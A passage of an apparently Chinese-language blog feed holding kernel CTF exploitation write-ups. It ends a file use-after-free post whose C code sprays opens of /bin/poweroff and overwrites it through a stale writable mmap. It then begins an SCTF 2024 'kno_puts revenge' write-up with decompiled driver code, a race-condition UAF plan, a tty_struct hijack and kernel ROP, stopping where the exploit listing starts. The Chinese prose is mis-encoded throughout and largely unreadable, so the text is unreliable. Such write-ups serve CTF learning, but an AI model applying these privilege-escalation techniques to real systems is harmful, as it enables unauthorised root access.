class="line">&#125;</span><br><span class="line">fchmod(dummy_fd, <span class="number">0777</span>);</span><br><span class="line">close(dummy_fd);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> uaf_file = open(<span class="string">&quot;/tmp/sh&quot;</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(uaf_file &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    err_exit(<span class="string">&quot;open low level file.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *data = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, uaf_file, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åå¤šæ¬¡è°ƒç”¨ fput å°†è¿™ä¸ªæ–‡ä»¶å¯¹åº”çš„ file-&gt;f_count å°†å…¶ç½®ä¸ºé›¶ä½¿å…¶è¢«é‡Šæ”¾ï¼Œä½† mmap ä»ç„¶å…·æœ‰é“¾æ¥åˆ°è¯¥å·²é‡Šæ”¾å—çš„æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€‚ç„¶åå¤§é‡ä»¥åªè¯»æƒé™æ¥æ‰“å¼€æˆ‘ä»¬æƒ³è¦è¶Šæƒå†™çš„æ–‡ä»¶ï¼Œç¡®ä¿æˆ‘ä»¬ä¹‹å‰çš„ uaf file èƒ½å¤Ÿè¢«é‡æ–°ä½¿ç”¨ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©å–·å°„çš„æ–‡ä»¶ä¸º &#x2F;bin&#x2F;poweroffã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Begin to spray file.&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x300</span>; i++)&#123;</span><br><span class="line">    spray_file[i] = open(<span class="string">&quot;/bin/poweroff&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (spray_file[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;spray file failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äº mmap æ˜¯ä»¥å†™æƒé™å¯åŠ¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ mmap æŒ‡å‘çš„å—çš„å†…å®¹ï¼Œå°½ç®¡å®ƒæœ€åˆå…·æœ‰åªè¯»è®¿é—®æƒé™ï¼Œæ­¤æ—¶æˆ‘ä»¬å³å¯è¶Šæƒä¿®æ”¹ &#x2F;bin&#x2F;poweroff æ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(data, elfcode, <span class="keyword">sizeof</span>(elfcode));</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/11/12/fileuaf/17.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å‘œå‘œå‘œï¼ŒäºŒè¿›åˆ¶çœŸçš„å¤ªå¥½ç©äº†ï¼Œå¯æ˜¯èƒ½ç»™æˆ‘ç©çš„æ—¶é—´ä¸å¤šäº†&#x2F;(ã„’oã„’)&#x2F;~~</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MzU3Mjc3Ng==&mid=2247488477&idx=1&sn=f8531b3220ea3a9ca2a0fdc2fd9dabc6&chksm=ce77d59af9005c8c2ef35c7e45f45cbfc527bfc4b99bbd02dbaaa964d174a4009897dd329a4d&scene=178&cur_album_id=2559805446807928833#rd">ä¸€æ­¥ä¸€å›¾å¸¦ä½ æ„å»º Linux é¡µè¡¨ä½“ç³» â€”â€” è¯¦è§£è™šæ‹Ÿå†…å­˜å¦‚ä½•ä¸ç‰©ç†å†…å­˜è¿›è¡Œæ˜ å°„ (qq.com)</a></p><p><a href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606">Understanding Dirty Pagetable - m0leCon Finals 2023 CTF Writeup - CTFã™ã‚‹ã (hatenablog.com)</a></p><p><a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty_Pagetable (yanglingxi1993.github.io)</a></p><p><a href="https://syst3mfailure.io/corjail/">[corCTF 2022] CoRJail: From Null Byte Overflow To Docker Escape Exploiting poll_list Objects In The Linux Kernel (syst3mfailure.io)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€é¢˜å¤šè§£ SCTF 2024 kno_puts revenge</title>
      <link href="/2024/10/07/kno_puts/"/>
      <url>/2024/10/07/kno_puts/</url>
      
        <content type="html"><![CDATA[<h2 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h2><p>åˆæœ‰ kernel å•¦  </p><img src="/2024/10/07/kno_puts/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¥½ä¹…æ²¡çœ‹ <code>kernel</code> äº†ï¼Œåˆšå¥½ <code>SCTF</code> ä¸Šå°±æ¥äº†ä¸€é“ç®€å•é¢˜ã€‚ç»“æœç”±äºç”Ÿç–äº†æ‰“çš„å·¨æ…¢ï¼Œè¿è¡€éƒ½æ²¡æ‹¿åˆ°ğŸ˜­ï¼ˆ4è¡€ï¼‰ä¸Šå›¾ä¸ºæ¯”èµ›æ—¶æ‰“é€šçš„æˆªå›¾ã€‚</p><p>ç”±äºé¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—ç”¨å¤šç§æ‰“æ³•æ¥è§£å†³è¿™é“é¢˜ç›®ï¼ŒåŒæ—¶ä¹Ÿå½“ä½œæ˜¯å¯¹ <code>kernel</code> çš„åº·å¤è®­ç»ƒã€‚è¿™ç¯‡æ–‡ç« åªæ˜¯å¯¹é¢˜ç›®è¿›è¡Œå„ç§æ”»å‡»æ‰‹æ®µçš„åˆ†æï¼Œä¸ä¼šå¯¹æ¯ä¸ªå†…æ ¸ç»“æ„ä½“çš„ç»“æ„ä»¥åŠæ”»å‡»æ‰‹æ³•çš„å…·ä½“åŸç†è¿›è¡Œè¯¦ç»†çš„è®²è§£ã€‚æœ¬ç¯‡æ–‡ç« æˆ‘ä¼šé€æ­¥å¢åŠ é¢˜ç›®çš„é™åˆ¶ï¼Œç„¶åä»ä½çº§åˆ°é«˜çº§ç”¨ä¸åŒçš„æ”»å‡»æ‰‹æ®µå¯¹é¢˜ç›®è¿›è¡Œæ±‚è§£ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><h3 id="å…³é”®ä»£ç ï¼š"><a href="#å…³é”®ä»£ç ï¼š" class="headerlink" title="å…³é”®ä»£ç ï¼š"></a>å…³é”®ä»£ç ï¼š</h3><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">my_module_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+30h] [rbp-E0h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+60h] [rbp-B0h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+94h] [rbp-7Ch] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+9Ch] [rbp-74h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+A4h] [rbp-6Ch]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+ACh] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+B4h] [rbp-5Ch]</span></span><br><span class="line">  _QWORD v12[<span class="number">4</span>]; <span class="comment">// [rsp+B8h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+D8h] [rbp-38h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+E0h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">32</span>]; <span class="comment">// [rsp+E8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  get_random_bytes(s2, <span class="number">32LL</span>);</span><br><span class="line">  check_object_size(v12, <span class="number">48LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(v12, a3, <span class="number">48LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  printk(&amp;unk_837);</span><br><span class="line">  *(_QWORD *)s1 = v12[<span class="number">0</span>];</span><br><span class="line">  v8 = v12[<span class="number">1</span>];</span><br><span class="line">  v9 = v12[<span class="number">2</span>];</span><br><span class="line">  v10 = v12[<span class="number">3</span>];</span><br><span class="line">  LOBYTE(v11) = v13;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, s2, <span class="number">0x20</span>uLL) )</span><br><span class="line">    v11 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v11 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-13LL</span>;</span><br><span class="line">  printk(&amp;unk_84D);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xFFF0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v14 || ptr )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    ptr = (<span class="type">void</span> *)_kmalloc(<span class="number">736LL</span>, <span class="number">3264LL</span>);</span><br><span class="line">    <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">0x2E0</span>uLL);</span><br><span class="line">    printk(&amp;unk_768);</span><br><span class="line">    v6 = v14;</span><br><span class="line">    check_object_size(&amp;ptr, <span class="number">8LL</span>, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_to_user(v6, &amp;ptr, <span class="number">8LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">0xFFF1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    v5 = ptr;</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( fchoice )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr = <span class="number">0LL</span>;</span><br><span class="line">        kfree(v5);</span><br><span class="line">        fchoice = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">module_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_820);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; <span class="number">0x2E0</span> || !ptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  v5 = ptr;</span><br><span class="line">  check_object_size(ptr, a3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)copy_from_user(v5, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="éšæœºæ•°ç»•è¿‡"><a href="#éšæœºæ•°ç»•è¿‡" class="headerlink" title="éšæœºæ•°ç»•è¿‡"></a>éšæœºæ•°ç»•è¿‡</h3><p>å¯ä»¥çœ‹åˆ°é¢˜ç›®ä¼šå…ˆç”Ÿæˆä¸€ä¸ª <code>32</code> ä½çš„éšæœºæ•°ç„¶åå’Œæˆ‘ä»¬è‡ªå·±çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œè¦æ¯”è¾ƒé€šè¿‡æ‰å¯ä»¥è¿›è¡Œåé¢çš„æ“ä½œã€‚è¿™é‡Œå¬è¯´æœ‰æŒºå¤šç§ç»•è¿‡æ–¹æ³•ï¼Œä½†ç”±äºè¿™ä¸æ˜¯é‡ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘åªç”¨æˆ‘è‡ªå·±çš„æ–¹æ³•ã€‚æˆ‘ä»¬å¯ä»¥èµŒéšæœºæ•°çš„ç¬¬ä¸€ä½æ˜¯ <code>\x00</code>ï¼Œè¿™ä¸ªæ—¶å€™æ¯”è¾ƒå°±ä¼šåªæ¯”è¾ƒç¬¬ä¸€ä½ <code>\x00</code>ï¼Œå†™ä¸ªå¾ªç¯çˆ†ç ´å³å¯ï¼Œæˆ‘çš„ <code>add</code> å’Œ <code>del</code> å‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å¯ä»¥å‘ç°è¿™ä¸ªå†…æ ¸é©±åŠ¨å¹¶æ²¡æœ‰ä¸Šé”ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥åˆ›é€ å‡º <code>UAF</code>ï¼Œå³åœ¨ <code>write</code> å‡½æ•°æ‰§è¡Œ <code>copy_from_user</code> å‰è°ƒç”¨ <code>kfree</code> è®²å †å—é‡Šæ”¾æ‰ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šå‡ºç° <code>UAF</code></p><p>åœ¨è¿›è¡Œå †å—åˆ›å»ºçš„æ—¶å€™ï¼Œå¯ä»¥çœ‹è§æœ‰ä¸€ä¸ª copy_to_user å‡½æ•°è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥æ³„éœ²å‡ºå †åœ°å€</p><h2 id="notes-leak-userfaultfd-tty-struct-rt-regs"><a href="#notes-leak-userfaultfd-tty-struct-rt-regs" class="headerlink" title="notes leak + userfaultfd + tty_struct + rt_regs"></a>notes leak + userfaultfd + tty_struct + rt_regs</h2><h3 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h3><p>è¿™æ˜¯ç¬”è€…æˆ‘æ¯”èµ›æ—¶æ‰€ä½¿ç”¨çš„è§£æ³•ï¼ŒåŒæ—¶ä¹Ÿåº”è¯¥æ˜¯æœ€å¥½æƒ³ã€æœ€ç›´æ¥ã€æœ€é¢„æœŸï¼ˆæˆ‘çŒœçš„ï¼‰çš„è§£æ³•ã€‚ä»ä¸€ä¸ªå†…æ ¸åˆå­¦è€…çš„è§’åº¦æ¥æƒ³ï¼Œåš <code>kernel pwn</code> è‚¯å®šè¦å…ˆæ³„éœ²å†…æ ¸åœ°å€ï¼Œå¾€å¾€è¿™å¹¶ä¸ç®€å•ï¼Œä½†è¿™é¢˜çš„å†…æ ¸åŸºå€æ˜¯ç™½ç»™çš„ï¼ï¼ï¼å…·ä½“åŸç†å¯ä»¥å‚è€ƒæˆ‘åŠå¹´å‰çš„åšå®¢<a href="https://qanux.github.io/2024/04/17/notes/">When ELF notes reveal too much | Qanuxâ€™s space</a></p><img src="/2024/10/07/kno_puts/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç®€å•çš„æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä» <code>/sys/kernel/notes</code> ä¸­ç›´æ¥è·å–å†…æ ¸çš„åœ°å€ã€‚å…¶æ¬¡æ˜¯å †åœ°å€ï¼Œå †åœ°å€çš„è·å–æ–¹æ³•å·²ç»å†™åœ¨é¢˜ç›®åˆ†æéƒ¨åˆ†äº†ï¼Œè¿™é‡Œä¸å†è¿›è¡Œè®²è¿°ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å…³æ³¨åˆ°çš„æ˜¯ä»–çš„ <code>add</code> æ“ä½œæ˜¯é€šè¿‡ <code>kmalloc</code> ç”³è¯·äº† <code>736</code> å­—èŠ‚çš„å†…å­˜ï¼Œè¿™ä¸ªå¤§å°åˆšå¥½æ˜¯ <code>tty_struct</code> ç»“æ„ä½“çš„å¤§å°ï¼Œè¿™ä¸æ˜¯æ‘†æ˜ç€è¦æˆ‘ä»¬é€šè¿‡åŠ«æŒ <code>tty_struct</code> çš„ <code>ops</code> æ¥å®ç°ç¨‹åºæµçš„æ§åˆ¶ï¼Ÿæˆ‘ä»¬å…ˆæ¥æŸ¥çœ‹å†…æ ¸çš„ç‰ˆæœ¬</p><img src="/2024/10/07/kno_puts/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥å‘ç°å†…æ ¸çš„ç‰ˆæœ¬æ¯”è¾ƒä½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>userfaultfd</code> æ¥å°†ç¨‹åºå¡åœ¨ <code>copy_from_user</code>ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åœ¨å†…æ ¸çš„æŸä¸ªä½ç½®å†™ä¸Š <code>kernel rop</code> ç„¶åé€šè¿‡åŠ«æŒ <code>tty_struct</code> æ ˆè¿ç§»åˆ°æˆ‘ä»¬çš„ <code>kernel rop</code> ä¸Šå»ã€‚å…¶å®è¿™é‡Œå¯ä»¥ç›´æ¥å°† <code>kernel rop</code> å†™é“ <code>tty_struct</code> ä¸Šç„¶åè¿›è¡Œä¸¤æ¬¡æ ˆè¿ç§»è·³è½¬åˆ°æˆ‘ä»¬çš„ <code>rop</code> ä¸Šï¼Œå¯æ˜¯æˆ‘æ‡’ï¼Œå®Œå…¨æ²¡è€ƒè™‘è¦è¿™ä¹ˆåšğŸ˜‡</p><p>ç„¶åæˆ‘å¹¸è¿çš„å‘ç°ï¼Œè¿™ä¸ªå†…æ ¸çš„ <code>pt_regs</code> å¹¶æ²¡æœ‰å¼€å¯éšæœºåŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´å½“å†…æ ¸æ‰§è¡Œ <code>tty_struct</code> è™šè¡¨ä¸Šçš„å‡½æ•°æ—¶è¯¥ç»“æ„ä¸ <code>rsp</code> çš„è·ç¦»ä¸ä¼šå˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å°† <code>kernel rop</code> å¸ƒå±€åˆ°è¿™ä¸ªä½ç½®ç„¶åä¼ªé€  <code>tty_struct ops</code> ç›´æ¥æ ˆè¿ç§»åˆ°æˆ‘ä»¬å¸ƒå±€å¥½çš„ <code>kernel rop</code> ä¸Šå®ç°ææƒ</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>ç”±äºæ¯”èµ›æ—¶æ¯”è¾ƒç´§å¼ ï¼ˆæƒ³æ‹¿è¡€ï¼‰ï¼Œè€Œä¸”é‡åˆ°äº†å¾ˆå¤šæ„å¤–å¿ƒæ€æœ‰ç‚¹å°å´©ï¼Œæ‰€ä»¥ <code>exp</code> å†™çš„æœ‰ç‚¹éš¾çœ‹ï¼Œå¯æ˜¯ä¸æƒ³æ”¹äº† :-)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span 